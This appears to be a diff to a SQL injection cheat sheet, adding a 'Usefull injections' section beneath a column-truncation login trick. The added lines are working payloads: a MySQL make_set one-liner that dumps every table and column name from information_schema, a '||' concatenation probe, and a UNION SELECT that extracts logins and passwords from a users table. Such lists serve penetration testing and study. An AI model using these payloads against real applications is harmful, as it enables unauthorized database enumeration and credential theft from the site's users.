@@ -125,3 +125,7 @@ e.g. :
 	login = varchar(25)
 	with $login = 'admin(blankspace x 19)x'
 
+- Usefull injections
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+'||' 
+UNION SELECT login,password FROM users WHERE login='admin';-- 
